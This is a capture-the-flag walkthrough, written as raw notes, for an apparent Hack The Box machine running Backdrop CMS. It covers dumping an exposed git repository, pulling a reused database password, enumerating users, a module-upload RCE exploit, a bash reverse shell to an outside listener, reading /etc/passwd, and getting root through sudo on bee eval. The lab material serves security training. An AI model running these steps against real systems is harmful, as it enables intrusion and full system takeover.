@@ -1,0 +1,195 @@
+
+
+
+/home/kali/.local/bin/git-dumper http://10.10.11.58/.git/ /tmp/dog-git
+
+
+┌──(root㉿kali)-[/tmp/dog-git]
+└─# git restore .
+                                                                                                                     
+┌──(root㉿kali)-[/tmp/dog-git]
+└─# ls                              
+core  files  index.php  layouts  LICENSE.txt  README.md  robots.txt  settings.php  sites  themes
+                                    
+
+┌──(root㉿kali)-[/tmp/dog-git]
+└─# cat settings.php
+...
+
+$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
+$database_prefix = '';
+...
+
+
+no mysql exposed
+need usnermaes
+backdropscan uses the following endpoint
+        req = requests.get(f'{url}/?q=accounts/{username}')
+
+we run a command like
+ffuf -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -u
+http://dog.htb/\?q=accounts/FUZZ -c -v -mc 403
+
+and get back john & tiffany as valid usernames. (status 403)
+
+we use this password for the tiffany account and get admin access to the site
+
+grep -ri 'version' .
+we find
+...
+./core/layouts/rolph/rolph.info:version = BACKDROP_VERSION
+./core/layouts/rolph/rolph.info:version = 1.27.1
+./core/layouts/moscone_flipped/moscone_flipped.info:version = BACKDROP_VERSION
+./core/layouts/moscone_flipped/moscone_flipped.info:version = 1.27.1
+./core/layouts/moscone/moscone.info:version = BACKDROP_VERSION
+./core/layouts/moscone/moscone.info:version = 1.27.1
+...
+
+https://www.exploit-db.com/exploits/52021
+
+Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 exploit_52021.py http://dog.htb/?q=
+Backdrop CMS 1.27.1 - Remote Command Execution Exploit
+Evil module generating...
+Evil module generated! shell.zip
+Go to http://dog.htb/?q=/admin/modules/install and upload the shell.zip for Manual Installation.
+Your shell address: http://dog.htb/?q=/modules/shell/shell.php
+
+the website does not accept zip files
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# tar -czvf shell.tar.gz shell
+shell/
+shell/shell.php
+shell/shell.info
+                                                                                                                     
+then we navigate to 
+http://dog.htb/modules/shell/shell.php
+for our shell
+and enter
+bash -c "bash -i >& /dev/tcp/10.10.14.16/4444 0>&1"
+
+┌──(root㉿kali)-[/tmp/dog-git]
+└─# nc -lvnp 4444             
+listening on [any] 4444 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.11.58] 46660
+bash: cannot set terminal process group (931): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@dog:/var/www/html/modules/shell$ 
+
+www-data@dog:/var/www/html/modules/shell$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+jobert:x:1000:1000:jobert:/home/jobert:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+johncusack:x:1001:1001:,,,:/home/johncusack:/bin/bash
+_laurel:x:997:997::/var/log/laurel:/bin/false
+www-data@dog:/var/www/html/modules/shell$ ls /home
+jobert	johncusack
+www-data@dog:/var/www/html/modules/shell$ 
+
+
+for john, password reuse
+
+┌──(root㉿kali)-[/home/kali]
+└─# ssh johncusack@10.10.11.58     
+The authenticity of host '10.10.11.58 (10.10.11.58)' can't be established.
+ED25519 key fingerprint is SHA256:M3A+wMdtWP0tBPvp9OcRf6sPPmPmjfgNphodr912r1o.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.58' (ED25519) to the list of known hosts.
+johncusack@10.10.11.58's password: 
+Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+ System information as of Fri 29 Aug 2025 11:43:56 AM UTC
+
+  System load:           0.0
+  Usage of /:            47.7% of 6.32GB
+  Memory usage:          19%
+  Swap usage:            0%
+  Processes:             237
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.58
+  IPv6 address for eth0: dead:beef::250:56ff:feb0:9cca
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+johncusack@dog:~$ 
+
+
+johncusack@dog:~$ sudo -l
+[sudo] password for johncusack: 
+Matching Defaults entries for johncusack on dog:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User johncusack may run the following commands on dog:
+    (ALL : ALL) /usr/local/bin/bee
+
+this is a command-line utility for managing the Backdrop CMS. 
+
+
+
+
+johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval "system('/bin/bash');"
+root@dog:/var/www/html# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
+
+
+
+
+
+
+
+
+
